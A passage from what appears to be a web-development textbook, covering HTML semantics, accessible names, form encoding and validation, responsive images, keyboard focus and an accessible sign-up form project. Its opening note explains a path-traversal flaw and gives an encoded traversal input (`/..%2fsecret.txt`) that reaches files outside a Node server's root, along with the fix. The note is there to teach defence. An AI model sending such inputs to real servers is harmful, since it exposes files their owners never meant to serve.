**DT-4. The URL parser removes `..` segments, but not an encoded slash: `/..%2fsecret.txt` reaches the server unchanged, decodes to `/../secret.txt`, and `path.join(ROOT, decoded)` — which joins first and normalises afterwards — produces a path *outside* the root. Normalising the decoded path on its own first (an absolute path cannot go above `/`), and then checking that the result is still inside the root, closes the hole; so does refusing any decoded path that contains `..`.** *(WHATWG URL Standard, "path state" — only literal and `%2e`-encoded dot segments are removed; Node.js `path.join`: "joins… then normalizes the resulting path"; OWASP, "Path Traversal")* Path traversal through encoded separators has appeared in real servers repeatedly (e.g. Apache HTTP Server 2.4.49, CVE-2021-41773).

### Review checklist

- What happens when a file changes between `stat` and `readFile`? Does the ETag still describe the body?
- How would you add `Range` requests, so that a video can be seeked?
- Why should the server stream large files (`createReadStream`) instead of reading them into memory?

## Answers to the Chapter 0 prediction questions

**Unit 0.1, Q1.** `https://a.example/x` — the base's last segment `d` is dropped, then `..` twice removes `c` and `b`. **Q2.** The fragment identifies a place inside the already-fetched document, so the server does not need it; single-page applications once used `#/route` URLs so that navigation never reloaded the page, and fragments are used to carry secrets that must not reach server logs (e.g. some OAuth implicit-flow tokens, and the keys in end-to-end-encrypted sharing links).

**Unit 0.2, Q1.** Many sites share one IP address (virtual hosting); the server needs the host name to know which site is meant. **Q2.** The server keeps waiting for more headers; nothing is answered until the connection times out.

**Unit 0.3, Q1.** The hashed file's content can never change under that name, so caching it for a year is always correct; `index.html` keeps its name across deployments, so a long `max-age` would keep users on the old version — referring to old asset names — for up to a year.

**Unit 0.4, Q1.** Two sibling links: `<a>` cannot nest, so the second `<a>` start tag closes the first — `<a>one </a><a>two</a>`.

**Unit 0.5, Q1.** `a.js`: deferred scripts run in document order, whatever order they arrive in. **Q2.** A script may read computed styles, so the browser will not run it until the stylesheets before it have loaded — and the parser waits for the script.

# Chapter 1 — HTML: Meaning, Forms, and Accessibility

*Goal: write HTML that says what things are, not how they look. You will see the two rendering modes a doctype selects, the accessibility tree the browser builds from your markup (and what a screen reader therefore hears), how names are computed for controls and images, how forms encode and validate data with no JavaScript at all, how the browser picks an image from `srcset`, and why a `<div>` with a click handler is not a button. The project is an accessible sign-up form, tested by keyboard and through the accessibility tree.*

**What you will be able to do after this chapter**

- Start every document correctly and explain standards and quirks modes.
- Choose semantic elements — landmarks, headings, lists, links, buttons — and check the result in the accessibility tree.
- Give every control and image a correct accessible name.
- Build forms that submit the right data in the right encoding and validate it with built-in constraints.
- Serve responsive images with `srcset` and `sizes`.
- Make interactive elements work with the keyboard.

## Topic 1A — Documents

## Unit 1.1 — The document and its modes

**One-line summary:** Every HTML document should start with `<!DOCTYPE html>`, `<html lang="…">`, `<meta charset="utf-8">`, a `<title>`, and (for mobile) a viewport `<meta>`; without the doctype, browsers switch to *quirks mode*, emulating 1990s rendering bugs that change layout in ways no modern CSS reference describes.

```html
<!-- file: doc/standards.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>standards mode</title></head>
<body>
  <div id="box"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="40" height="20" alt=""></div>
  <table><tr><td id="cell">text in a table</td></tr></table>
  <script>
    const px = (el, prop) => getComputedStyle(el)[prop];
    console.log(`compatMode: ${document.compatMode}`);
    console.log(`div around a 20px image is ${document.getElementById("box").getBoundingClientRect().height}px tall`);
    document.body.style.fontSize = "24px";
    console.log(`body font-size 24px, table cell font-size: ${px(document.getElementById("cell"), "fontSize")}`);
  </script>
</body>
</html>
```

`quirks.html` is identical except for the missing first line:

```html
<!-- file: doc/quirks.html -->

<html lang="en">
<head><meta charset="utf-8"><title>quirks mode</title></head>
<body>
  <div id="box"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="40" height="20" alt=""></div>
  <table><tr><td id="cell">text in a table</td></tr></table>
  <script>
    const px = (el, prop) => getComputedStyle(el)[prop];
    console.log(`compatMode: ${document.compatMode}`);
    console.log(`div around a 20px image is ${document.getElementById("box").getBoundingClientRect().height}px tall`);
    document.body.style.fontSize = "24px";
    console.log(`body font-size 24px, table cell font-size: ${px(document.getElementById("cell"), "fontSize")}`);
  </script>
</body>
</html>
```

```console
$ cd doc && python3 ../../tools/page.py standards.html
compatMode: CSS1Compat
div around a 20px image is 24px tall
body font-size 24px, table cell font-size: 24px
$ cd doc && python3 ../../tools/page.py quirks.html
compatMode: BackCompat
div around a 20px image is 20px tall
body font-size 24px, table cell font-size: 16px
```

Two of the many quirks: in quirks mode an image alone in a block does not reserve space below the text baseline for descenders (the box is exactly 20 px instead of 24), and tables do not inherit the font size from the body. Each line of the standard skeleton has a job:

| Line | Why |
| --- | --- |
| `<!DOCTYPE html>` | Selects standards mode — its only function today |
| `<html lang="en">` | Language for screen-reader pronunciation, hyphenation, spell-checking, translation |
| `<meta charset="utf-8">` | Text encoding; must be within the first 1,024 bytes |
| `<meta name="viewport" content="width=device-width, initial-scale=1">` | Otherwise mobile browsers lay the page out 980 px wide and shrink it |
| `<title>` | Tab title, bookmarks, search results, and the first thing a screen reader announces |

### Mastery check

1. **Explain.** Why must `<meta charset>` come before any non-ASCII text, including the `<title>`?

## Unit 1.2 — Semantic elements and the accessibility tree

**One-line summary:** Browsers build an accessibility tree from the DOM — roles (button, link, heading, navigation…), names, and states — and assistive technology such as screen readers, voice control, and browser reader modes see only that tree; semantic elements produce it for free, while generic `<div>`s and `<span>`s contribute nothing but their text.

Two pages with the same look and very different meaning:

```html
<!-- file: semantics/soup.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Div soup</title></head>
<body>
  <div class="header"><div class="logo">Acme</div>
    <div class="nav"><span class="link" onclick="location='/'">Home</span>
      <span class="link" onclick="location='/blog'">Blog</span></div></div>
  <div class="content">
    <div class="title">Release notes</div>
    <div class="subtitle">Version 2.0</div>
    <div>Faster and smaller.</div>
    <img src="chart.svg">
  </div>
  <div class="footer">© Acme</div>
</body>
</html>
```

```html
<!-- file: semantics/semantic.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Release notes — Acme</title></head>
<body>
  <header>
    <p>Acme</p>
    <nav aria-label="Main"><ul><li><a href="/">Home</a></li><li><a href="/blog">Blog</a></li></ul></nav>
  </header>
  <main>
    <article>
      <h1>Release notes</h1>
      <h2>Version 2.0</h2>
      <p>Faster and smaller.</p>
      <img src="chart.svg" alt="Bar chart: start-up time fell from 1.2 s to 0.4 s">
    </article>
  </main>
  <footer><p><small>© Acme</small></p></footer>
</body>
</html>
```

The driver's `aria:` step prints the accessibility tree as Chromium exposes it to assistive technology. (The "Failed to load resource" lines are the browser reporting image files that these examples do not include.)

```console
$ cd semantics && python3 ../../tools/page.py soup.html "aria:body"
Failed to load resource: net::ERR_FILE_NOT_FOUND
- text: Acme Home Blog Release notes Version 2.0 Faster and smaller.
- img
- text: © Acme
$ cd semantics && python3 ../../tools/page.py semantic.html "aria:body"
Failed to load resource: net::ERR_FILE_NOT_FOUND
- banner:
  - paragraph: Acme
  - navigation "Main":
    - list:
      - listitem:
        - link "Home":
          - /url: /
      - listitem:
        - link "Blog":
          - /url: /blog
- main:
  - article:
    - heading "Release notes" [level=1]
    - heading "Version 2.0" [level=2]
    - paragraph: Faster and smaller.
    - 'img "Bar chart: start-up time fell from 1.2 s to 0.4 s"'
- contentinfo:
  - paragraph: © Acme
```

The div-soup page is a flat run of text and one unnamed image: no links (the "links" are spans with click handlers, unreachable by keyboard), no headings to jump between, no landmarks. The semantic page exposes a navigation landmark with a real list of links, a heading hierarchy, and an image with a description. Screen-reader users navigate mostly by headings and landmarks, so this structure *is* the page's interface for them.

| Element | Role | Use for |
| --- | --- | --- |
| `<header>`, `<footer>` (outside article) | banner, contentinfo | Site header and footer |
| `<nav>` | navigation | Major blocks of navigation links |
| `<main>` | main | The page's unique content — one per page |
| `<article>`, `<section>` | article, region (if named) | Self-contained content; thematic groups with a heading |
| `<h1>`–`<h6>` | heading | A real outline: don't skip levels for styling |
| `<a href>` | link | Going somewhere (a URL) |
| `<button>` | button | Doing something (an action) |
| `<ul>`/`<ol>`/`<li>` | list, listitem | Lists, including menus of links |

### Mastery check

1. **Explain.** Why is "use `<a>` to go somewhere and `<button>` to do something" more than a style rule?

## Unit 1.3 — Accessible names

**One-line summary:** Every interactive element and meaningful image needs an *accessible name*, computed by a fixed algorithm: `aria-labelledby`, then `aria-label`, then the native label (`<label>`, `alt`, the button's content), then fallbacks such as `title` or `placeholder`; an empty `alt=""` marks an image as decorative, while a missing `alt` leaves screen readers guessing.

```html
<!-- file: semantics/names.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Accessible names</title></head>
<body>
  <label>Email <input type="email"></label>
  <label for="phone">Phone</label> <input id="phone" type="tel">
  <input type="search" placeholder="Search the docs">
  <input type="text">
  <button aria-label="Close dialog">×</button>
  <button><img src="trash.svg" alt="Delete"></button>
  <a href="/report.pdf">Click here</a>
  <img src="decorative-line.svg" alt="">
  <img src="photo.jpg">
</body>
</html>
```

```console
$ cd semantics && python3 ../../tools/page.py names.html "aria:body"
Failed to load resource: net::ERR_FILE_NOT_FOUND
Failed to load resource: net::ERR_FILE_NOT_FOUND
Failed to load resource: net::ERR_FILE_NOT_FOUND
- text: Email
- textbox "Email"
- text: Phone
- textbox "Phone"
- searchbox "Search the docs"
- textbox
- button "Close dialog": ×
- button "Delete":
  - img "Delete"
- link "Click here":
  - /url: /report.pdf
- img
```

Both label styles — wrapping, and `for` pointing at an `id` — name their inputs. The search box is named only by its placeholder (a fallback: it disappears as soon as the user types, and many tools ignore it); the plain text box has no name at all. The icon buttons are named by `aria-label` and by the image's `alt`. "Click here" is a valid name but useless out of context — screen-reader users often list all links on a page. The decorative image is absent from the tree, as intended; the photo without `alt` appears as a nameless image.

### Deep & Tricky

**DT-5. `aria-label` replaces the element's content as its accessible name — for a button containing visible text, speech-input users who say the visible words ("click Save") then cannot activate it, because the name is something else; and ARIA changes only what is exposed to assistive technology, never behaviour: `role="button"` does not make an element focusable or keyboard-operable.** *(W3C, "Accessible Name and Description Computation 1.2", step 2C before 2F; WCAG 2.2 Success Criterion 2.5.3 "Label in Name"; WAI-ARIA 1.2 §1.1: "ARIA … does not change … behavior")* The first rule of ARIA is not to use it when a native element exists.

### Mastery check

1. **Predict.** What is the accessible name of `<button aria-labelledby="t">×</button>` with `<span id="t">Close</span>` elsewhere on the page?

## Topic 1B — Forms

## Unit 1.4 — Forms and how they submit

**One-line summary:** A `<form>` collects its named controls and submits them without any JavaScript: `method="get"` puts them in the URL's query string, `method="post"` sends them in the body as `application/x-www-form-urlencoded`, and `enctype="multipart/form-data"` (required for file uploads) sends each field as a separate part.

```html
<!-- file: forms/form.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Three ways to submit</title></head>
<body>
  <form id="search" action="/search" method="get">
    <label>Search <input name="q"></label>
    <label><input type="checkbox" name="exact" value="yes"> Exact match</label>
    <button>Search</button>
  </form>

  <form id="comment" action="/comments" method="post">
    <label>Name <input name="name"></label>
    <label>Comment <textarea name="text"></textarea></label>
    <button>Post</button>
  </form>

  <form id="upload" action="/upload" method="post" enctype="multipart/form-data">
    <label>Title <input name="title"></label>
    <input type="file" name="doc">
    <button>Upload</button>
  </form>
</body>
</html>
```

```js
// file: forms/echo-server.mjs
// Serves form.html and prints exactly what the browser submits.
import http from "node:http";
import { readFile } from "node:fs/promises";

http.createServer(async (req, res) => {
  if (req.url === "/" || req.url === "/form.html") {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    return res.end(await readFile("form.html"));
  }
  let body = "";
  for await (const chunk of req) body += chunk;
  console.log(`${req.method} ${req.url}`);
  if (body) {
    console.log(`  Content-Type: ${req.headers["content-type"]}`);
    console.log("  body: " + body.replace(/\r\n/g, "\n        "));
  }
  res.writeHead(200, { "Content-Type": "text/plain" }).end("thanks\n");
}).listen(8090);
```

```console
$ cd forms && python3 ../../tools/page.py http://localhost:8090/ "fill:#search input[name=q]|café & bar" "click:#search input[name=exact]" "click:#search button" wait:300 --serve "node echo-server.mjs" --server-log
GET /search?q=caf%C3%A9+%26+bar&exact=yes
$ cd forms && python3 ../../tools/page.py http://localhost:8090/ "fill:#comment input[name=name]|Ana" "fill:#comment textarea|Hi, 1+1=2!" "click:#comment button" wait:300 --serve "node echo-server.mjs" --server-log
POST /comments
  Content-Type: application/x-www-form-urlencoded
  body: name=Ana&text=Hi%2C+1%2B1%3D2%21
$ cd forms && echo "my notes" > notes.txt && python3 ../../tools/page.py http://localhost:8090/ "fill:#upload input[name=title]|Notes" "upload:#upload input[type=file]|notes.txt" "click:#upload button" wait:300 --serve "node echo-server.mjs" --server-log
POST /upload
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhayCALlPq41PG92v
  body: ------WebKitFormBoundaryhayCALlPq41PG92v
        Content-Disposition: form-data; name="title"
        
        Notes
        ------WebKitFormBoundaryhayCALlPq41PG92v
        Content-Disposition: form-data; name="doc"; filename="notes.txt"
        Content-Type: text/plain
        
        my notes

        ------WebKitFormBoundaryhayCALlPq41PG92v--
        
```

Only controls with a `name` are submitted; an unchecked checkbox is not sent at all, and a checked one sends its `value` (or `on`). In URL encoding, the space becomes `+`, and `&`, `=`, `+`, `,`, and non-ASCII characters are percent-encoded so that they cannot be confused with the separators. Multipart encoding separates fields with a random boundary string and carries file names and types. A form whose action changes data must use POST: GET requests may be repeated, prefetched, cached, and logged with their query strings.

### Mastery check

1. **Predict.** What does the search form submit if the checkbox is left unchecked and the box is empty?

## Unit 1.5 — Built-in validation

**One-line summary:** Input types (`email`, `number`, `url`, `date`…) and attributes (`required`, `min`/`max`/`step`, `minlength`/`maxlength`, `pattern`) declare constraints that the browser checks before submitting, exposes through the `validity` object and `:invalid` CSS selector, and reports with localised messages — and `setCustomValidity` adds rules of your own.

```html
<!-- file: forms/validate.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Constraint validation</title></head>
<body>
  <form id="f">
    <label>Email <input id="email" type="email" required></label>
    <label>Age <input id="age" type="number" min="18" max="120" step="1"></label>
    <label>Postcode <input id="zip" pattern="[0-9]{5}" title="five digits"></label>
    <label>Username <input id="user" required minlength="3" maxlength="12"></label>
  </form>
  <script>
    function report(label, values) {
      for (const [id, value] of Object.entries(values)) document.getElementById(id).value = value;
      console.log(`--- ${label}: form valid = ${document.getElementById("f").checkValidity()}`);
      for (const el of document.querySelectorAll("input")) {
        const broken = Object.keys(ValidityState.prototype).filter((k) => k !== "valid" && el.validity[k]);
        console.log(`${el.id.padEnd(5)} ${JSON.stringify(el.value).padEnd(15)} ${el.validity.valid ? "ok" : broken.join(", ") + ": " + el.validationMessage}`);
      }
    }
    report("empty form", {});
    report("bad values", { email: "ana@", age: "17.5", zip: "1234", user: "ab" });
    report("good values", { email: "ana@example.com", age: "30", zip: "12345", user: "ana" });
  </script>
</body>
</html>
```

```console
$ cd forms && python3 ../../tools/page.py validate.html
--- empty form: form valid = false
email ""              valueMissing: Please fill out this field.
age   ""              ok
zip   ""              ok
user  ""              valueMissing: Please fill out this field.
--- bad values: form valid = false
email "ana@"          typeMismatch: Please enter a part following '@'. 'ana@' is incomplete.
age   "17.5"          rangeUnderflow, stepMismatch: Value must be greater than or equal to 18.
zip   "1234"          patternMismatch: Please match the requested format.
user  "ab"            ok
--- good values: form valid = true
email "ana@example.com" ok
age   "30"            ok
zip   "12345"         ok
user  "ana"           ok
$ cd forms && python3 ../../tools/page.py validate.html "fill:#user|ab" "eval:[document.getElementById('user').validity.tooShort, document.getElementById('user').validationMessage]"
--- empty form: form valid = false
email ""              valueMissing: Please fill out this field.
age   ""              ok
zip   ""              ok
user  ""              valueMissing: Please fill out this field.
--- bad values: form valid = false
email "ana@"          typeMismatch: Please enter a part following '@'. 'ana@' is incomplete.
age   "17.5"          rangeUnderflow, stepMismatch: Value must be greater than or equal to 18.
zip   "1234"          patternMismatch: Please match the requested format.
user  "ab"            ok
--- good values: form valid = true
email "ana@example.com" ok
age   "30"            ok
zip   "12345"         ok
user  "ana"           ok
=> [true, "Please lengthen this text to 3 characters or more (you are currently using 2 characters)."]
```

Each failed constraint sets one flag of `ValidityState` (`valueMissing`, `typeMismatch`, `patternMismatch`, `rangeUnderflow`, `stepMismatch`…), and `validationMessage` describes it in the browser's language. An empty optional field is valid — `pattern` and `min` apply only to non-empty values.

### Deep & Tricky

**DT-6. `minlength` and `maxlength` are checked only for values the *user* edited: a value set by script (or present in the HTML) that is too short does not set `tooShort`, so the "bad values" run above reports `"ab"` as valid, while the same two characters typed by a user make it invalid. Tests that set `.value` directly therefore never see length errors.** *(HTML Living Standard §4.10.18.3: the `tooShort` constraint applies only when "the element's dirty value flag is true" and "its value was last changed by a user edit")* And client-side validation is a convenience, never security: anyone can send any request with `curl`, so the server must validate everything again.

### Mastery check

1. **Predict.** An `<input type="number" step="0.5" min="1">` contains `2.25`. Which validity flag is set?

## Topic 1C — Media and interaction

## Unit 1.6 — Responsive images

**One-line summary:** `srcset` lists image files with their widths (`800w`) or densities (`2x`), and `sizes` tells the browser — before any CSS is loaded — how wide the image will be displayed; the browser then picks the smallest candidate that covers display width × device pixel ratio, so phones do not download desktop images and high-density screens get sharp ones.

```text
# file: img/make.sh
for w in 400 800 1600; do
  echo "<svg xmlns='http://www.w3.org/2000/svg' width='$w' height='$((w/2))'><rect width='100%' height='100%' fill='teal'/></svg>" > photo-$w.svg
done
```

```html
<!-- file: img/responsive.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Responsive images</title>
  <style> body { margin: 0; } .half { width: 50vw; } </style>
</head>
<body>
  <img id="full" alt="A teal rectangle"
       srcset="photo-400.svg 400w, photo-800.svg 800w, photo-1600.svg 1600w"
       sizes="100vw" src="photo-800.svg">
  <img id="half" class="half" alt="The same, at half width"
       srcset="photo-400.svg 400w, photo-800.svg 800w, photo-1600.svg 1600w"
       sizes="(min-width: 900px) 50vw, 100vw" src="photo-800.svg">
  <script>
    addEventListener("load", () => {
      for (const id of ["full", "half"]) {
        const img = document.getElementById(id);
        console.log(`${id}: ${img.currentSrc.split("/").pop()} shown at ${img.width}px wide`);
      }
    });
  </script>
</body>
</html>
```

```console
$ cd img && sh make.sh && for cfg in "--width 375 --dpr 1" "--width 375 --dpr 3" "--width 1280 --dpr 1" "--width 1280 --dpr 2"; do echo "== $cfg"; python3 ../../tools/page.py responsive.html $cfg; done
== --width 375 --dpr 1
full: photo-400.svg shown at 375px wide
half: photo-400.svg shown at 188px wide
== --width 375 --dpr 3
full: photo-1600.svg shown at 375px wide
half: photo-1600.svg shown at 188px wide
== --width 1280 --dpr 1
full: photo-1600.svg shown at 1280px wide
half: photo-800.svg shown at 640px wide
== --width 1280 --dpr 2
full: photo-1600.svg shown at 1280px wide
half: photo-1600.svg shown at 640px wide
```

A 375-px phone at density 1 needs 375 device pixels and gets the 400-px file; at density 3 it needs 1,125 and gets the 1,600-px file. On the desktop, the "half" image needs 640 or 1,280 device pixels. The browser may also use network conditions and its cache in the choice; the rule is that it never needs to download more than one candidate.

### Deep & Tricky

**DT-7. The browser chooses from `srcset` using the `sizes` attribute, not the image's CSS width, because it must start the download before stylesheets and layout are done — so `sizes` is a promise, and a wrong one is silently obeyed: on the phone, the "half" image is *displayed* 188 px wide but `sizes` says `100vw`, so at density 3 the browser fetches the 1,600-px file where the 800-px file would have been enough.** *(HTML Living Standard §4.8.4.2.2 "Sizes attributes" and §4.8.4.3 "Selecting an image source"; the preload scanner fetches images before layout)* Newer browsers accept `sizes="auto"` for `loading="lazy"` images, which are fetched after layout.

### Mastery check

1. **Calculate.** A 768-px tablet at density 2 shows the "full" image. Which file is chosen?

## Unit 1.7 — Keyboard access and focus

**One-line summary:** Everything a mouse can do must be possible with the keyboard: native buttons, links, and form controls are focusable with Tab and activate with Enter or Space, but a `<div>` with a click handler is neither focusable nor operable, and adding `role="button"` and `tabindex="0"` makes it focusable without making Enter or Space work.

```html
<!-- file: a11y/buttons.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Three "buttons"</title></head>
<body>
  <div class="btn" id="div-button">Save (div)</div>
  <div class="btn" id="aria-button" role="button" tabindex="0">Save (div with role)</div>
  <button id="real-button">Save (button)</button>
  <script>
    for (const el of document.querySelectorAll("#div-button, #aria-button, #real-button"))
      el.addEventListener("click", () => console.log(`  clicked: ${el.id}`));
    document.addEventListener("focusin", (e) => console.log(`focus -> ${e.target.id}`));
  </script>
</body>
</html>
```

The driver tabs through the page, pressing Enter and Space at each stop:

```console
$ cd a11y && python3 ../../tools/page.py buttons.html "aria:body" press:Tab press:Enter press:Space press:Tab press:Enter press:Space press:Tab
- text: Save (div)
- button "Save (div with role)"
- button "Save (button)"
focus -> aria-button
focus -> real-button
  clicked: real-button
  clicked: real-button
```

The plain `<div>` is skipped by Tab entirely and is plain text in the accessibility tree. The `<div role="button" tabindex="0">` is announced as a button and receives focus — and then ignores Enter and Space, so a keyboard user hears "button", presses it, and nothing happens. The real `<button>` gets focus and fires `click` for both keys, with no extra code. Replicating that by hand needs a `keydown` handler for Enter, a `keyup` handler for Space, disabled state, form submission, and more; using `<button>` costs nothing.

### Pattern

**P-2. Use native elements first; reach for ARIA only to describe custom widgets that HTML lacks (tabs, tree views, comboboxes), and then follow the WAI-ARIA Authoring Practices pattern for that widget, including its keyboard behaviour.** *(W3C, "Using ARIA", first rule; WAI-ARIA Authoring Practices Guide)* *Trade-off:* native controls are harder to style (form controls especially, though `appearance: none` and newer features such as customisable `<select>` are closing the gap); custom widgets are fully stylable but every behaviour is your responsibility.

### Mastery check

1. **Explain.** Why should you not use `tabindex` values greater than 0?

## Chapter 1 Project — An accessible sign-up form

### Requirements

Build a sign-up form that works without JavaScript and is better with it:

- Labelled fields: email, password (with a visible hint), password confirmation, a radio group in a `<fieldset>` with a `<legend>`, and a required terms checkbox; correct `autocomplete` values.
- Built-in constraints on every field; a custom rule that the passwords match.
- With JavaScript: on submit, show each error next to its field (linked with `aria-describedby`), mark fields with `aria-invalid`, and show an error summary of links to the fields, which receives focus.
- Test it through the accessibility tree and by submitting both invalid and valid data.

### Reference solution

```html
<!-- file: project/signup.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Create an account</title>
</head>
<body>
  <main>
    <h1>Create an account</h1>
    <div id="summary" role="alert" tabindex="-1" hidden>
      <h2>Please fix these problems</h2>
      <ul id="problems"></ul>
    </div>
    <form id="signup" action="/accounts" method="post" novalidate>
      <p>
        <label for="email">Email address</label>
        <input id="email" name="email" type="email" autocomplete="email" required
               aria-describedby="email-error">
        <span id="email-error" class="error"></span>
      </p>
      <p>
        <label for="password">Password</label>
        <input id="password" name="password" type="password" autocomplete="new-password"
               required minlength="8" aria-describedby="password-hint password-error">
        <span id="password-hint">At least 8 characters.</span>
        <span id="password-error" class="error"></span>
      </p>
      <p>
        <label for="confirm">Repeat the password</label>
        <input id="confirm" name="confirm" type="password" autocomplete="new-password" required
               aria-describedby="confirm-error">
        <span id="confirm-error" class="error"></span>
      </p>
      <fieldset>
        <legend>How often may we email you?</legend>
        <label><input type="radio" name="frequency" value="weekly" checked> Weekly</label>
        <label><input type="radio" name="frequency" value="monthly"> Monthly</label>
        <label><input type="radio" name="frequency" value="never"> Never</label>
      </fieldset>
      <p>
        <label><input type="checkbox" name="terms" id="terms" required aria-describedby="terms-error">
          I accept the terms</label>
        <span id="terms-error" class="error"></span>
      </p>
      <button>Create account</button>
    </form>
  </main>
  <script src="signup.js"></script>
</body>
</html>
```

```js
// file: project/signup.js
// Progressive enhancement: the form works without JavaScript (the server must validate anyway);
// with it, errors are shown next to each field and in a summary that receives focus.
const form = document.getElementById("signup");
const password = document.getElementById("password");
const confirm = document.getElementById("confirm");
const labelOf = (input) => (input.labels[0]?.textContent ?? input.name).trim();

function checkConfirm() {
  confirm.setCustomValidity(confirm.value && confirm.value !== password.value
    ? "The passwords do not match." : "");
}
password.addEventListener("input", checkConfirm);
confirm.addEventListener("input", checkConfirm);

function showErrors() {
  const problems = [];
  for (const input of form.querySelectorAll("input[id]")) {
    const message = input.validity.valid ? "" : input.validationMessage;
    document.getElementById(`${input.id}-error`).textContent = message;
    input.setAttribute("aria-invalid", String(!input.validity.valid));
    if (message) problems.push({ input, message });
  }
  return problems;
}

form.addEventListener("submit", (event) => {
  checkConfirm();
  const problems = showErrors();
  const summary = document.getElementById("summary");
  if (problems.length === 0) { summary.hidden = true; return; }    // let the browser submit
  event.preventDefault();
  const list = document.getElementById("problems");
  list.replaceChildren(...problems.map(({ input, message }) => {
    const link = Object.assign(document.createElement("a"), { href: `#${input.id}`,
      textContent: `${labelOf(input)}: ${message}` });
    const item = document.createElement("li");
    item.append(link);
    return item;
  }));
  summary.hidden = false;
  summary.focus();                                                  // screen readers announce it
  console.log(`blocked: ${problems.length} problems; focus on #${document.activeElement.id}`);
});
```

```js
// file: project/server.mjs
// Serves the form and its script, and prints what the browser submits.
import http from "node:http";
import { readFile } from "node:fs/promises";

const files = { "/": ["signup.html", "text/html; charset=utf-8"],
                "/signup.js": ["signup.js", "text/javascript; charset=utf-8"] };
http.createServer(async (req, res) => {
  if ((req.method === "GET" || req.method === "HEAD") && files[req.url]) {
    const [name, type] = files[req.url];
    res.writeHead(200, { "Content-Type": type });
    return res.end(await readFile(name));
  }
  let body = "";
  for await (const chunk of req) body += chunk;
  console.log(`server received ${req.method} ${req.url}: ${body}`);
  res.writeHead(201, { "Content-Type": "text/plain" }).end("account created\n");
}).listen(8091);
```

```console
$ cd project && python3 ../../tools/page.py http://localhost:8091/ "aria:form" --serve "node server.mjs" --server-log
- paragraph:
  - text: Email address
  - textbox "Email address"
- paragraph:
  - text: Password
  - textbox "Password"
  - text: At least 8 characters.
- paragraph:
  - text: Repeat the password
  - textbox "Repeat the password"
- group "How often may we email you?":
  - text: How often may we email you?
  - radio "Weekly" [checked]
  - text: Weekly
  - radio "Monthly"
  - text: Monthly
  - radio "Never"
  - text: Never
- paragraph:
  - checkbox "I accept the terms"
  - text: I accept the terms
- button "Create account"
$ cd project && python3 ../../tools/page.py http://localhost:8091/ "fill:#email|ana@" "fill:#password|secret12" "fill:#confirm|secret13" "click:button" "aria:#summary" --serve "node server.mjs" --server-log
blocked: 3 problems; focus on #summary
- alert:
  - heading "Please fix these problems" [level=2]
  - list:
    - listitem:
      - 'link "Email address: Please enter a part following ''@''. ''ana@'' is incomplete."':
        - /url: "#email"
    - listitem:
      - 'link "Repeat the password: The passwords do not match."':
        - /url: "#confirm"
    - listitem:
      - 'link "I accept the terms: Please check this box if you want to proceed."':
        - /url: "#terms"
$ cd project && python3 ../../tools/page.py http://localhost:8091/ "fill:#email|ana@example.com" "fill:#password|secret12" "fill:#confirm|secret12" "click:input[value=monthly]" "click:#terms" "click:button" wait:300 "eval:document.body.textContent.trim()" --serve "node server.mjs" --server-log
server received POST /accounts: email=ana%40example.com&password=secret12&confirm=secret12&frequency=monthly&terms=on
=> "account created"
```

Every control has a name, the radio buttons form a named group, and the hint is part of the password field's description. The invalid submission is blocked, the summary is announced as an alert and receives focus, and each entry links to its field. The valid submission reaches the server as an ordinary URL-encoded POST — exactly as it would with JavaScript turned off.

### Deep & Tricky

**DT-8. `novalidate` on the form turns off the browser's own blocking and bubbles, but not the constraints: `checkValidity()`, `validity`, `validationMessage`, and the `:invalid` selector keep working, which is how the project shows its own messages. And a custom error set with `setCustomValidity` stays until it is cleared with an empty string — forgetting to clear it leaves the field invalid forever.** *(HTML Living Standard §4.10.21.3 "Form submission algorithm" (the no-validate state) and §4.10.20 "The constraint validation API": "setCustomValidity(message)… if the argument is the empty string, clears the custom error")*

### Review checklist

- Remove the `<script>` tag and submit an invalid form. What happens, and what must the server do?
- Does the error summary still make sense when the page is zoomed to 400% (WCAG reflow)?
- How would you announce errors that appear *while* the user types, without interrupting them?

## Answers to the Chapter 1 prediction questions

**Unit 1.1, Q1.** The parser decodes the bytes before the declaration with a guessed encoding; if the guess differs, everything already decoded is wrong, and the browser may have to reparse. Placing it first (within 1,024 bytes) makes the guess unnecessary.

**Unit 1.2, Q1.** Links and buttons have different keyboard behaviour (Enter vs Enter and Space), different roles announced to screen readers, and different browser features (open in new tab, copy link, history); using the wrong one breaks expectations that users rely on.

**Unit 1.3, Q1.** "Close" — `aria-labelledby` takes precedence over the content.

**Unit 1.4, Q1.** `GET /search?q=` — the empty text field is sent with an empty value; the unchecked checkbox is not sent.

**Unit 1.5, Q1.** `stepMismatch`: valid values are 1, 1.5, 2, 2.5… (steps counted from `min`).

**Unit 1.6, Q1.** 768 × 2 = 1,536 device pixels: the smallest candidate that covers it is the 1,600-px file.

**Unit 1.7, Q1.** Positive values move elements ahead of the document order, so focus jumps around the page in an order that no longer matches the visual or reading order, and every later change must renumber them; use 0 (natural order) and -1 (focusable only by script).

# Chapter 2 — CSS: Selectors, the Cascade, and the Box Model

*Goal: understand how the browser decides the value of every property on every element. CSS is not a list of styles applied in order; it is a set of rules competing through the cascade — origin, importance, layers, specificity, and order — followed by inheritance and the computation of values. You will query selectors against a real DOM, watch specificity and cascade layers decide winners, see which properties inherit and how relative units resolve, measure the box model and margin collapsing, and finish by writing a specificity calculator that agrees with the browser on 600 test cases.*

**What you will be able to do after this chapter**

- Write selectors with combinators, attribute selectors, pseudo-classes, and `:has()`.
- Predict the winning declaration from origin, importance, layer, specificity, and order.
- Use cascade layers to organise a style sheet so that specificity battles disappear.
- Explain inheritance, the `inherit`/`initial`/`unset`/`revert` keywords, and how `em`, `rem`, and `%` resolve.
